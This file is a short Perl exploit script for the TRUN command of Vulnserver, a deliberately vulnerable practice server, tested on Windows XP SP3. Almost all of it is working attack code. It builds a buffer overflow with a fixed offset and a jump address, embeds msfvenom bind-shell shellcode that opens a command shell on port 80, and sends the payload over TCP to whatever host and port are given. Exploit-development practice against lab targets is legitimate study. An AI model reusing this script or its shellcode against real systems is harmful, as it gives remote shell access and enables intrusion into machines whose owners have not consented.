#!/usr/bin/perl

# Vulnserver TRUN exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows XP Professional Version 2002 Service Pack 3 

use IO::Socket;

if($ARGV[1] eq ''){
die "Proper usage: $0 IP_ADDRESS PORT \n\n";
}

$badheader = "TRUN /.:/";
$baddata .= "\x41" x 2003; #exact offset at 2003

$baddata .= "\xaf\x11\x50\x62";

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00" -f perl -v baddata BufferRegister=ESP ExitFunc=thread
# 350 bytes

$baddata .= "\xbe\x29\x11\x9a\x29\x89\xe5\x29\xc9\xb1\x53\x83\xed\xfc" .
"\x31\x75\x0e\x03\x5c\x1f\x78\xdc\x62\xf7\xfe\x1f\x9a\x08" .
"\x9f\x96\x7f\x39\x9f\xcd\xf4\x6a\x2f\x85\x58\x87\xc4\xcb" .
"\x48\x1c\xa8\xc3\x7f\x95\x07\x32\x4e\x26\x3b\x06\xd1\xa4" .
"\x46\x5b\x31\x94\x88\xae\x30\xd1\xf5\x43\x60\x8a\x72\xf1" .
"\x94\xbf\xcf\xca\x1f\xf3\xde\x4a\xfc\x44\xe0\x7b\x53\xde" .
"\xbb\x5b\x52\x33\xb0\xd5\x4c\x50\xfd\xac\xe7\xa2\x89\x2e" .
"\x21\xfb\x72\x9c\x0c\x33\x81\xdc\x49\xf4\x7a\xab\xa3\x06" .
"\x06\xac\x70\x74\xdc\x39\x62\xde\x97\x9a\x4e\xde\x74\x7c" .
"\x05\xec\x31\x0a\x41\xf1\xc4\xdf\xfa\x0d\x4c\xde\x2c\x84" .
"\x16\xc5\xe8\xcc\xcd\x64\xa9\xa8\xa0\x99\xa9\x12\x1c\x3c" .
"\xa2\xbf\x49\x4d\xe9\xd7\xbe\x7c\x11\x28\xa9\xf7\x62\x1a" .
"\x76\xac\xec\x16\xff\x6a\xeb\x59\x2a\xca\x63\xa4\xd5\x2b" .
"\xaa\x63\x81\x7b\xc4\x42\xaa\x17\x14\x6a\x7f\x8d\x1c\xcd" .
"\xd0\xb0\xe1\xad\x80\x74\x49\x46\xcb\x7a\xb6\x76\xf4\x50" .
"\xdf\x1f\x09\x5b\xdf\x8f\x84\xbd\xb5\x3f\xc1\x16\x21\x82" .
"\x36\xaf\xd6\xfd\x1c\x87\x70\xb5\x76\x10\x7f\x46\x5d\x36" .
"\x17\xcd\xb2\x82\x06\xd2\x9e\xa2\x5f\x45\x54\x23\x12\xf7" .
"\x69\x6e\xc4\x94\xf8\xf5\x14\xd2\xe0\xa1\x43\xb3\xd7\xbb" .
"\x01\x29\x41\x12\x37\xb0\x17\x5d\xf3\x6f\xe4\x60\xfa\xe2" .
"\x50\x47\xec\x3a\x58\xc3\x58\x93\x0f\x9d\x36\x55\xe6\x6f" .
"\xe0\x0f\x55\x26\x64\xc9\x95\xf9\xf2\xd6\xf3\x8f\x1a\x66" .
"\xaa\xc9\x25\x47\x3a\xde\x5e\xb5\xda\x21\xb5\x7d\xfa\xc3" .
"\x1f\x88\x93\x5d\xca\x31\xfe\x5d\x21\x75\x07\xde\xc3\x06" .
"\xfc\xfe\xa6\x03\xb8\xb8\x5b\x7e\xd1\x2c\x5b\x2d\xd2\x64";

$baddata .= "\x42" x (5000-length($baddata));

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);
